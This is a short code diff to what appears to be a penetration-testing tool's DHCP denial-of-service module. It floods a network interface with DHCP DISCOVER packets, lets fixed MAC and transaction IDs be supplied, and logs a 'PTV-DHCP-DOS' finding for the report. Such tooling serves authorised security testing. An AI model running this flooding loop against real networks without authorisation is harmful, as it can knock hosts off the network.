@@ -18,7 +18,7 @@ def _run_denial(ctx):
         duration = ctx.duration if hasattr(ctx, 'duration') and ctx.duration else None
 
         while duration is None or (time.time() - start_time) < duration:
-            sendp(prepare_discover_packet(random_mac(), random_xid()),
+            sendp(prepare_discover_packet(ctx.mac or random_mac(), ctx.xid or random_xid()),
                   iface=ctx.interface, verbose=False)
             count += 1
 
@@ -31,6 +31,7 @@ def _run_denial(ctx):
         ctx.out(f"[-] Error during DoS: {str(e)}", "ERROR", indent=4)
 
     ctx.out(f"[*] Total packets sent: {count}", "INFO", indent=4)
+    ctx.ptjsonlib.add_vulnerabiltiy("PTV-DHCP-DOS")
     
 def run(ctx):
     _run_denial(ctx)
